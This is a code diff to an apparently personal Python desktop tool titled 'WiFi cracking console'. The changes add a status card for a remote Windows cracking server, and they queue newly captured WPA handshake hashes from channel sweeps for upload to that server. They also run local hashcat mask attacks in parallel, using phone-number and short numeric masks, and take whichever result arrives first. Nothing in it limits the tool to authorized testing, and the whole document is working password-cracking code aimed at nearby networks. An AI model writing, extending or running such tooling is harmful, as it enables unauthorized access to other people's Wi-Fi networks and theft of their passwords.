@@ -175,9 +175,6 @@ class App:
         top.pack(fill='x', padx=14, pady=(12, 6))
         ttk.Label(top, text='WiFi 破解台', font=FONT_H, foreground=C_TEXT,
                   background=C_BG).pack(side='left')
-        self.lbl_wip = ttk.Label(top, text='', font=FONT, foreground=C_DIM,
-                                 background=C_BG)
-        self.lbl_wip.pack(side='left', padx=16)
         # status cards: USB 網卡 + VM 介面
         self.card_usb = tk.Label(top, text='🔌 抓包網卡：檢查中…', font=FONT_B,
                                  bg='#1e2534', fg=C_DIM, padx=14, pady=6,
@@ -187,6 +184,10 @@ class App:
                                 bg='#1e2534', fg=C_DIM, padx=14, pady=6,
                                 anchor='w', relief='flat')
         self.card_vm.pack(side='left', padx=4)
+        self.card_net = tk.Label(top, text='☁ Windows：檢查中…', font=FONT_B,
+                                 bg='#1e2534', fg=C_DIM, padx=14, pady=6,
+                                 anchor='w', relief='flat')
+        self.card_net.pack(side='left', padx=4)
         ttk.Label(top, text='Windows 電腦', font=FONT, foreground=C_DIM,
                   background=C_BG).pack(side='left')
         ttk.Entry(top, textvariable=self.var['wip'], width=14,
@@ -465,6 +466,16 @@ class App:
                 tv, cv = '📶 掃描引擎：—', C_DIM
             self._ui(lambda: self._set_text(self.card_usb, tu, cu))
             self._ui(lambda: self._set_text(self.card_vm, tv, cv))
+            ok_ts = getattr(self, '_api_ok_ts', 0)
+            if time.time() - ok_ts < 130:
+                tn = '☁ Windows：✅ %s' % getattr(self, '_good_ep', '')
+                cn = C_GREEN
+            else:
+                nq = len(self._load_queue())
+                tn = ('☁ Windows：❌ 離線 · 補傳佇列 %d 台' % nq if nq
+                      else '☁ Windows：❌ 離線')
+                cn = C_AMBER if nq else C_RED
+            self._ui(lambda: self._set_text(self.card_net, tn, cn))
             for _ in range(5):
                 if self._stop.is_set():
                     return
@@ -1069,6 +1080,7 @@ class App:
             with open(pth, 'a') as f:
                 f.write('\n'.join(new) + '\n')
             self.hash_pool.update(new)
+            self._enqueue_sweep_hits(new)
         self._ev('sweep', 'cycle ch=%d new=%d' % (len(chans), len(new)))
         return len(new)
 
@@ -1240,15 +1252,27 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
                     return
                 time.sleep(1)
             return
-        # ---- 4. wait Windows (自動解 或 在家等你在網頁確認) ----
+        # ---- 4. Windows + Mac 同步破解 (誰先誰贏) ----
+        win = {}
+
+        def _win_wait():
+            win['r'] = self._wait_result(wip, port, timeout=900)
+
+        threading.Thread(target=_win_wait, daemon=True).start()
         if status == 'pending':
-            self.set_phase('crack', '等待你在 Windows 網頁按「開始破解」',
-                           '顯存被本地模型佔用')
+            self.set_phase('crack', 'Windows 掛起 + Mac 同步低難度解',
+                           '手機/數字 mask 本機跑')
         else:
-            self.set_phase('crack', 'Windows 破解中...',
-                           'watching %s:%s' % (wip, port))
+            self.set_phase('crack', 'Windows + Mac 同步破解中',
+                           '手機/數字 mask 本機跑')
         self._result('破解中…', C_AMBER)
-        result = self._wait_result(wip, port, timeout=900)
+        result = self._crack_local(abort=lambda: bool(win.get('r')))
+        if not result:
+            for _ in range(950):
+                if win.get('r') or self._stop.is_set():
+                    break
+                time.sleep(1)
+            result = win.get('r')
         if result:
             self.set_phase('done', '🎉 破解成功', result)
             self._result('🎉  %s' % result, C_GREEN)
@@ -1268,6 +1292,50 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
                 if len(f) >= 4 and f[2] == b:
                     out.append(h)
         return out
+
+    def _enqueue_sweep_hits(self, new_lines):
+        # 巡掃新 hash 屬掃描列表內未破解 AP → 入補傳隊列(有網自動傳)
+        try:
+            byb = {}
+            for l in new_lines:
+                f = l.split('*')
+                if len(f) > 3:
+                    byb.setdefault(f[3].lower(), []).append(l)
+            ckd = self._known()[0]
+            sil = self._silent_set()
+            cnt = 0
+            for b, ls in byb.items():
+                if b in sil:
+                    continue
+                ent = self.aps_seen.get(b) or self.aps_seen.get(b.upper())
+                if not ent:
+                    continue
+                ssid = ent[0] or 'wifi'
+                if ckd.get(ssid):
+                    continue
+                self._save_local_bssid(ssid, b, ls)
+                self._enqueue_upload(ssid, b)
+                cnt += 1
+            if cnt:
+                self._ev('sweep', 'enq %d AP for resend' % cnt)
+        except Exception as e:
+            self._ev('sweep', 'enq err=%r' % e)
+
+    def _save_local_bssid(self, ssid, bssid, lines):
+        try:
+            os.makedirs(HASHSTORE, exist_ok=True)
+            safe = re.sub(r'[^A-Za-z0-9._-]', '_', ssid) or 'wifi'
+            path = os.path.join(HASHSTORE, '%s_%s.22000' % (safe, bssid.lower()))
+            seen = set()
+            if os.path.exists(path):
+                seen = set(l.strip() for l in open(path) if l.strip())
+            nw = [l for l in lines if l.strip() not in seen]
+            if nw:
+                with open(path, 'a') as f:
+                    for l in nw:
+                        f.write(l + '\n')
+        except Exception:
+            pass
 
     def _save_local(self, ssid, lines):
         try:
@@ -1411,7 +1479,7 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
             pass
         return None
 
-    def _crack_local(self):
+    def _crack_local(self, abort=None):
         hc = '/opt/homebrew/bin/hashcat'
         if not os.path.exists(hc):
             self._log('❌ Mac 沒裝 hashcat')
@@ -1423,22 +1491,16 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
         except Exception:
             return None
         pot = os.path.expanduser('~/wifi_cracker/local_pot')
-        wl_dir = os.path.expanduser('~/wifi_cracker/wordlists')
         pw = self._read_pot_pw(pot)
         if pw:
             self._log('   ✅ 本機 potfile 秒回')
             return pw
-        stages = []
-        try:
-            for w in sorted(os.listdir(wl_dir)):
-                if os.path.getsize(os.path.join(wl_dir, w)) < 60 * 1024 * 1024:
-                    stages.append((os.path.join(wl_dir, w), None))
-        except Exception:
-            pass
-        stages += [(None, '09?d?d?d?d?d?d?d?d'), (None, '?d?d?d?d?d?d?d?d'),
-                   (None, '?d?d?d?d?d?d?d?d?d?d')]
+        # 只跑低難度: 6碼/手機門號/8碼純數字 (大字典交 Windows GPU)
+        stages = [(None, '?d?d?d?d?d?d'),
+                  (None, '09?d?d?d?d?d?d?d?d'),
+                  (None, '?d?d?d?d?d?d?d?d')]
         for wl, mask in stages:
-            if self._stop.is_set():
+            if self._stop.is_set() or (abort and abort()):
                 return None
             desc = mask or os.path.basename(wl)
             self._ui(lambda d=desc: self._set_text(
@@ -1499,6 +1561,7 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
                         method='POST')
                     body = urllib.request.urlopen(req, timeout=timeout).read()
                 self._good_ep = ep
+                self._api_ok_ts = time.time()
                 return body.decode('utf-8', 'replace'), ep
             except Exception as e:
                 last = e
